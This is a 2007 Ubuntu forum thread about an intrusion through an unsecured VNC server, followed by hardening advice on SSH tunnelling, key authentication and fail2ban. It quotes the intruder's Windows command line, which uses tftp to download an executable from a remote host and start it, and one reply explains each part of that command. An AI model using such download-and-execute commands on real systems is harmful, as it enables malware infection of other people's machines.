---
title: "!!!Someone Accessed My PC Through VNC with me Watching!!!"
date: 2007-10-29
forum: Server Platforms
---

### Post by superyounan1 on 2007-10-29
I had gedit open and was working on a website when suddenly the ubuntu tray icon popped up notifying me that someone has logged in via VNC! Then the following string of text was entered at the location of my cursor in gedit!!:

```
%systemroo
t%\	system32\cmd.exe
tftp -i 6.116 get iexplore.exe&start iexplore.exe
```

Clearly windows commands!
(see screenshot)

They were gone before I had a chance to disconnect them, the text was entered very quickly, i doubt it was manually typed.

How the hell did they get passed my vnc password? I'm quite sure I had a password set, I'm always prompted for my password whenever I vnc in from my other computer (in the same house), but went to System > Preferences > Remote Desktop Preferences I found "Require Password" unchecked?
[I]
Is it possible that someone gained access to my PC via vino-server by either finding out my password somehow or using brute force cracking methods, then turned off password authentication? Or is vino just that easy to circumvent??[/I]

I've blocked the vnc port on my router, and almost everything else, but I'm suddenly very concerned about security, what should i do?

[SIZE="5"]**And does vino-server keep connection logs? I dug around the forum but couldn't find info on it, I want their IP so I can report this low-life!**[/SIZE]

---

### Post by WIGGMPk on 2007-10-29
I wouldnt worry to much about it.

Im not sure on how that would work in VNC. I wouldnt get to bent out of shape about it. It looks like the 'suspected' person is a Windows user. Given the fact that you claim it was thru a VNC connection it looks like he's trying to replace 'iexplorer.exe' on your computer. Prolly with a jacked version or something.

tftp -i 6.116 get iexplore.exe&start iexplore.exe

-i = means octet; which is a transfer mode for binary files
6.116 = should be a full IP address (from where ever your 'getting' the file from)
get = means your transfering a file from a source to your computer

Given the fact that your running a Unix/Linux machine, even if the transfer was completed you wouldnt be in any serious danger from the resulting file. However I would be more concered with the VNC issue as you seem to be already.

---

### Post by Cochise on 2007-10-29
interested in this too as i use vnc quite a bit

---

### Post by netlogic on 2007-10-29
Comprising VNC can be done, since it is login with a password doesn't change very often. Your standard VNC layer can deciphered easily. By the way, is this large LAN? The sniffer can be hidden many places in the network. I always recommended never use VNC by itself. Alway, wrap Vnc with ssh and let ssh do the authentication and block VNC port in the firewall and forward to another port.

---

### Post by loell on 2007-10-29
interesting, had the intruder person/software guessed that your running ubuntu, maybe he/it can do something specific on the system :)

nevertheless , its scary that it cracked your vnc password somehow.

---

### Post by netlogic on 2007-10-29
> **loell said:**
> interesting, had the intruder person/software guessed that your running ubuntu, maybe he/it can do something specific on the system :)

nevertheless , its scary that it cracked your vnc password somehow.

A simple basic scanner such as nmap can do a fingerprinting for which OS it is running. There are tools to crack VNC passwords. By default, VNC is not a secure protocol.  Passwords are not sent in plain-text, but brute-force cracking can be done if both the encryption key and encoded password are sniffed from a network. It does take a while to crack, but most people don't change their VNC passwords that often. That's why it is better to wrap your "standard" VNC session with SSH. The commercial version of RealVNC offers high-strength encryption, but I still recommend using SSH with private/public key with a strong passphrase. 

Also, it isn't hard to do a man in the middle attack by attacking DNS server and pretend to login to a fake server and grab the password. That's why ssh with public/private keys are nice. It prevents from man in the middle attack.

---

### Post by netlogic on 2007-10-29
By the way, I know someone will yell out Linux is more insecure than MS. RDP protocol can be comprised  too. However, one thing better on RDP than VNC is you use the AD for authentication, which should have a policy to change passwords very often. That is why people only use RDP over IPSEC or PPTP. Anyway, a rule to always follow is try to stick with ssh for everything over internet. If you have to use other protocols, please wrap them with ssh with private/public key.

---

### Post by DoorGunner on 2007-10-29
I had something similar happen to me with ssh. One way fix this from ever happening is to go and change your ports in the VNC config file and on your /etc/services. The higher the port number the better. I havent tried it with VNC however it may be possible

---

### Post by netlogic on 2007-10-29
if you applied ssh with private/public keys and keys are hidden in the encrypted volume from the source client, ssh is totally secure. that's only way to do it. i have seen companies where admins used private/public keys and left the admins home drivee unencrypted. the security is a good policy. the software is only the tools to get it done.

---

### Post by DoorGunner on 2007-10-29
I absolutely agree net logic..... In Feisty  it didnt set up encryption automatically. There was a known bug with ssh.  So i followed one of the guides that made thet suggestion to change ports as well. I also copied Edgies key generator over.  

I did an awk on security as suggested. and some guy made some 300  hack attempts on TCP22 so  that was the real cue to move the port to something really obscure. Since then no more hacking attempts.

 By moving the ports you are simply moving it to an unknown or unused location. It just makes it harder to locate and a little harder to determe what is on that port. Thats all.

---

### Post by netlogic on 2007-10-29
most port scanners can easily find your ssh port within few minutes or seconds. brut forcing a simple password can be easily done within few days. that's why if you don't want to use the private/public key method, it is a must to install fail2ban or other tools that blocks ip address of failed attempts.

---

### Post by wieman01 on 2007-10-29
Actually I would be a bit concerned as well. And I would remove VNC immediately and replace it with SSH, nothing less. Change passwords frequently and choose reasonably complex ones, block all unneccessary ports and make sure you system is up-to-date (in particular in terms of security updates). 

That way you will be ok.

---

### Post by wieman01 on 2007-10-29
> **netlogic said:**
> most port scanners can easily find your ssh port within few minutes or seconds. brut forcing a simple password can be easily done within few days. that's why if you don't want to use the private/public key method, it is a must to install fail2ban or other tools that blocks ip address of failed attempts.
But you can tell your firewall (through Firestarter) to operate in stealthing mode, can't you? This way a scanner would see nothing in fact.

---

### Post by DoorGunner on 2007-10-29
I do have the public and private keys. They work fantastic.  I have my network changed over to that since that experience. I was really lucky that it wasnt a costly type of hack. Security is one of those things that is really important to learn

I never heard of fail2ban. It sounds very interesting.  Thanks for the suggestion.

---

### Post by netlogic on 2007-10-29
> **wieman01 said:**
> But you can tell your firewall (through Firestarter) to operate in stealthing mode, can't you? This way a scanner would see nothing in fact.

Yes, it is possible, if this isn't a server and all your ports are closed. I am assuming you will be needing your ssh for remote access. If you installed fail2ban or private/public key method with a long passphrase to login, you are very safe. You can set fail2ban or other banning scripts to only allow 3 bad login attempts and let it time out for 20 minutes. At that rate, on your standard eight character password, it will take more than three years. Hopefully, you will change your password before that time. The best approach is use private/public key method. ssh has proven to be safe for many years now if you wisely implemented. OpenBSD developers took codes from original codes from ssh1 and did extensive work on version 2.6, which Linux community greatly benefits. Ssh is only way to fly without having any worries.

---

### Post by superyounan1 on 2007-10-30
> **netlogic said:**
> By the way, is this large LAN?.

No, this is just a plain old simple home network with 2, sometimes 3 computers connected to home dsl service. I can't imagine I would be a target for such an attack.

I use my home computer as a web server for convenience and sometimes work related things, as of now I only have port 80 and 22 forwarded to my computer.

I don't use a software firewall because the network is tiny and private, and i wouldn't block anything that isn't already blocked by my router.
[B]
My primary interest now is being able to get a connection logs that would identify the source IP of the vnc connection.
[/B]
Could this be part of a botnet web, an automated attempt to infect carried out by a zombie windows machine somewhere?

---

### Post by netlogic on 2007-10-30
If you have to access your desktop over internet, try using VNC over SSH.
I found a good link for you.
[https://help.ubuntu.com/community/VNCOverSSH](https://help.ubuntu.com/community/VNCOverSSH)
Do you least have a home router protecting you from the outside? If your desktop is hooked right to internet and you are using VNC, I would suggest play with your iptable.  There are various frontend for iptable.

Good luck

---

### Post by superyounan1 on 2007-10-30
> **netlogic said:**
> If you have to access your desktop over internet, try using VNC over SSH.
I found a good link for you.
[https://help.ubuntu.com/community/VNCOverSSH](https://help.ubuntu.com/community/VNCOverSSH)
Do you least have a home router protecting you from the outside? If your desktop is hooked right to internet and you are using VNC, I would suggest play with your iptable.  There are various frontend for iptable.

Good luck

yep, i have all ports blocked on my router except 22 and 80. thanks for the link

---

